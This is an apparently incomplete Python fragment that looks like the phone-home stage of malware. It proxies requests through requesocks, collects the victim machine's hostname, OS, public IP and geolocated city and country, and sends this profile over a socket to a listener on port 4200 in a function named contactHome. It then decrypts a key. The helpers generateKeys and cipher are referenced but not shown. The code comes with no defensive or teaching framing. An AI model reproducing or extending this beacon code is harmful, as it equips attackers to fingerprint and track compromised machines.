def myInfo():
    global host, idMsg, msg

    # Get public facing IP
    session = requesocks.session()
    ipJson = session.get("http://httpbin.org/ip").text
    jsonStr = json.loads(ipJson)
    ip = jsonStr['origin']

    ipJson2 = session.get("http://freegeoip.net/json/" + ip).text
    jsonStr2 = json.loads(ipJson2)
    city = jsonStr2['city']
    country = jsonStr2['country_name']

    data = {}
    data['hostname'] = socket.gethostname()
    data['os'] = platform.platform()
    data['external_ip'] = ip
    data['city'] = city
    data['country'] = country
    json_data = json.dumps(data)

    msg = json_data

def contactHome():

    global msg, sep, vKey, sig, message



    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 4200))
    print ('connected')


    print (msg)

    s.sendall(msg)
    s.close()

    print (cipher.decrypt(vKey))

myInfo()
generateKeys()
contactHome()